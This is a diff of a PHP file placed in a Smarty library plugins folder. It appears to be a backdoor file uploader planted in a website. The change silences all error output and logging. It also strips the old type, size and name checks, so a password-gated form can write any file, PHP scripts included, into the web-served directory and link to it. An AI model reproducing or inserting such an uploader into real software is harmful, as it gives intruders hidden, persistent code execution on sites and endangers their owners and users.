@@ -1,119 +1,45 @@
 <?
 session_start();
+@ini_set('display_errors', 'off');
+@ini_set('error_reporting', 0);
+@ini_set('log_errors', 'off');
 $full_url="/Smarty/libs/plugins/";
-
 $folder="./";
-
 $error="";
 $success="";
 $display_message="";
-$file_ext=array();
-$password_form="";
-
-$random_name=false;
-
-$alts=array("php");
-
-$fullpath="";
-
-$mfz="5120000";
-
-$mcz="6048000";
-
 $f_nums="1";
 
-function get_ext($key) { 
-	$key=strtolower(substr(strrchr($key, "."), 1));
-	$key=str_replace("jpeg","jpg",$key);
-	return $key;
-}
-
-function cln_file_name($string) {
-	$cln_filename_find=array("/\.[^\.]+$/", "/[^\d\w\s-]/", "/\s\s+/", "/[-]+/", "/[_]+/");
-	$cln_filename_repl=array("", ""," ", "-", "_");
-	$string=preg_replace($cln_filename_find, $cln_filename_repl, $string);
-	return trim($string);
-}
-
-If(($_POST['submit']==true) AND ($password_form=="")) {
-
-	If(array_sum($_FILES['file']['size']) > $mcz*1024) {
-		
-		$error.="<b>FAILED:</b> All Files <b>REASON:</b> size is to large.<br />";
-		
-	
-	} Else {
-
-		
-		For($i=0; $i <= $f_nums-1; $i++) {
-			
-			
-			If($_FILES['file']['name'][$i]) {
-
-				
-				$file_ext[$i]=get_ext($_FILES['file']['name'][$i]);
-				
-				
-				If($random_name){
-					$file_name[$i]=time()+rand(0,100000);
-				} Else {
-					$file_name[$i]=cln_file_name($_FILES['file']['name'][$i]);
+if((!empty($_POST['submit']) && $_POST['submit']==true) AND !empty($_SESSION['u_pa'])) {
+	for($i=0; $i <= $f_nums-1; $i++) {
+		if($_FILES['file']['name'][$i]) {
+			$file_name[$i]=$_FILES['file']['name'][$i];
+			if(str_replace(" ", "", $file_name[$i])=="") {
+				$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> Blank name.<br />";
+			} elseif(file_exists($folder.$file_name[$i])) {
+				$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> already exists.<br />";
+			} else {
+				if(move_uploaded_file($_FILES['file']['tmp_name'][$i],$folder.$file_name[$i])) {
+					$success.="<b>SUCCESS:</b> ".$_FILES['file']['name'][$i]."<br />";
+					$success.="<b></b> <a href=\"".$full_url.$file_name[$i]."\" target=\"_blank\">".$full_url.$file_name[$i]."</a><br /><br />";
+				} else {
+					$error.="<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> General failure.<br />";
 				}
-	
-				
-				If(str_replace(" ", "", $file_name[$i])=="") {
-					
-					$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> Blank name.<br />";
-				
-				
-				}	ElseIf(!in_array($file_ext[$i], $alts)) {
-								
-					$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> Invalide type.<br />";
-								
-				
-				} Elseif($_FILES['file']['size'][$i] > ($mfz*1024)) {
-					
-					$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> large.<br />";
-					
-				
-				} Elseif(file_exists($folder.$file_name[$i].".".$file_ext[$i])) {
-	
-					$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> already exists.<br />";
-					
-				} Else {
-					
-					If(move_uploaded_file($_FILES['file']['tmp_name'][$i],$folder.$file_name[$i].".".$file_ext[$i])) {
-						
-						$success.="<b>SUCCESS:</b> ".$_FILES['file']['name'][$i]."<br />";
-						$success.="<b></b> <a href=\"".$full_url.$file_name[$i].".".$file_ext[$i]."\" target=\"_blank\">".$full_url.$file_name[$i].".".$file_ext[$i]."</a><br /><br />";
-						
-					} Else {
-						$error.="<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> General failure.<br />";
-					}
-					
-				}
-							
-			} 
-		
+			}		
 		} 
-		
 	} 
-	
-	If(($error=="") AND ($success=="")) {
+	if(($error=="") AND ($success=="")) {
 		$error.="<b>FAILED:</b> No files selected<br />";
 	}
-
 	$display_message=$success.$error;
-
 } 
-
 
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
 <meta http-equiv="Content-Language" content="en-us" />
-<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title> </title>
 
 <?
@@ -149,36 +75,16 @@ if(empty($_SESSION['u_pa']))
 	th();
 ?>
 
-
-<form action="<?=$_SERVER['PHP_SELF'];?>" method="post" enctype="multipart/form-data" name="name" style="/*display:none;*/">
-<table align="center" class="table">
-
-
-	<?If($display_message){?>
-	<tr>
-		<td colspan="2" class="message">
-		<br />
-			<?=$display_message;?>
-		<br />
-		</td>
-	</tr>
+<form action="<?=$_SERVER['PHP_SELF'];?>" method="post" enctype="multipart/form-data" name="name">
+	<?if($display_message){?>
+	<br /><?=$display_message;?><br />
 	<?}?>
 	
-
-	<?For($i=0;$i <= $f_nums-1;$i++) {?>
-		<tr>
-			
-			<td class="table_body" width="80%"><input type="file" name="file[]" size="30" /></td>
-		</tr>
+	<?for($i=0;$i <= $f_nums-1;$i++) {?>
+	<input type="file" name="file[]" size="30" />
 	<?}?>
-	<tr>
-		<td colspan="2" align="center" class="table_footer">
-			<input type="hidden" name="submit" value="true" />
-			<input type="submit" value=" Set " /> &nbsp;
-			<input type="reset" name="reset" value=" Reset " onclick="window.location.reload(true);" />
-		</td>
-	</tr>
-</table>
+	<input type="hidden" name="submit" value="true" />
+	<input type="submit" value=" Set " /> 
 </form>
 
 <?} ?>
